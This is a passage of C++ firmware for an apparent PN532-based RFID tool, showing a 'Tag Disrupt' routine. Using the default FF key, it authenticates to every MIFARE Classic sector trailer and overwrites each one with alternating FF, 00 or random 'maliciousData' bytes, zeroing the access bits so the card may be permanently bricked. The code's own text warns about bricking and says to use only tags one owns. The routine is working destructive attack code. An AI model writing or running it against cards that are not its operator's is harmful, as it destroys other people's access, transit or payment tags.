      "Bad access bits can brick a tag.\n\n"
      "Only use tags you own or are allowed to modify.\n\n"
      "Present a Classic tag (~12 s window).";

  uint8_t uid[7] = {0};
  uint8_t uidLength = 0;
  uint8_t maliciousData[16];
  uint8_t key[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  static const uint8_t sectorTrailers[] = {3,  7,  11, 15, 19, 23, 27, 31,
                                           35, 39, 43, 47, 51, 55, 59, 63};
  bool any = false;
  int trailersOk = 0;
  int authFail = 0;

  rfidAttachBus();
  if (!rfidListenIso14443a("Tag Disrupt", "Cancel", uid, &uidLength, 12000UL,
                           "Classic tag — hold on coil (~12 s window)", kIntro)) {
    rfidRestoreBus();
    return;
  }

  CardType ct = detectCardType(uid, uidLength);
  char uidStr[24] = "";
  uidToHex(uidStr, sizeof(uidStr), uid, uidLength);
  rfidSetDynamicPill("OK", UI_OK);
  rfidSetBandAux(nullptr);
  rfidDynamicBand(0, "Tag detected", uidStr);
  rfidPrint(String("[+] Tag detected ") + uidStr, UI_OK, false);

  if (ct != MIFARE_CLASSIC) {
    rfidRestoreBus();
    char msg[120];
    snprintf(msg, sizeof(msg), "Tag types as %s.\nDisrupt targets Classic trailers only.",
             cardTypeStr(ct));
    rfidResultAndDismiss("Tag Disrupt", "Skipped", msg);
    return;
  }

  rfidTransitionToProgress("Tag Disrupt", "Writing sector trailers", "Cancel",
                           "Rotating trailer write patterns.\n16 sector trailers targeted.");
  rfidSetDynamicPill("WRITE", UI_WARN);
  for (uint8_t i = 0; i < 16; i++) {
    uint8_t block = sectorTrailers[i];
    char l2[48];
    snprintf(l2, sizeof(l2), "Trailer block %u — sector %u", (unsigned)block, (unsigned)i);
    rfidDynamicBand(RF_DYN_TOP_PROG, "Rotating trailer pattern", l2);
    char infoLine[72];
    snprintf(infoLine, sizeof(infoLine), "Writing trailer block %u (sector %u).", (unsigned)block,
             (unsigned)i);
    rfidRefreshInfoPanel("PROGRESS", infoLine);
    if (rfidPollCancel()) {
      rfidRestoreBus();
      if (!rfidSessionExitRequested()) {
        rfidResultAndDismiss("Tag Disrupt", "Stopped", "Aborted mid-write.");
      }
      return;
    }

    if (i % 3 == 0) {
      memset(maliciousData, 0xFF, 16);
    } else if (i % 3 == 1) {
      memset(maliciousData, 0x00, 16);
    } else {
      for (uint8_t j = 0; j < 16; j++) {
        maliciousData[j] = (uint8_t)random(256);
      }
    }
    maliciousData[6] = 0x00;
    maliciousData[7] = 0x00;
    maliciousData[8] = 0x00;

    if (!s_nfc.mifareclassic_AuthenticateBlock(uid, uidLength, block, 0, key)) {
      authFail++;
    } else if (s_nfc.mifareclassic_WriteDataBlock(block, maliciousData)) {
      any = true;
      trailersOk++;
    }
    delay(35);
  }

  rfidRestoreBus();

  char msg[320];
  const char* fw = s_pn532VerStr[0] ? s_pn532VerStr : "PN532";
  snprintf(msg, sizeof(msg),
           "Tag UID: %s\n"
           "Reader IC: %s\n\n"
           "Sector trailers touched: %d / 16\n"
           "Key A auth failures:    %d\n\n"
           "%s\n\n"
           "Patterns alternate FF / 00 / random on trailers.\n"
           "Access bits may brick the tag.",
           uidStr, fw, trailersOk, authFail,
           any ? "At least one trailer write succeeded." : "No trailer writes succeeded.");

  rfidResultAndDismiss("Tag Disrupt", any ? "Finished" : "No writes", msg);
}

} // namespace RfidNfc
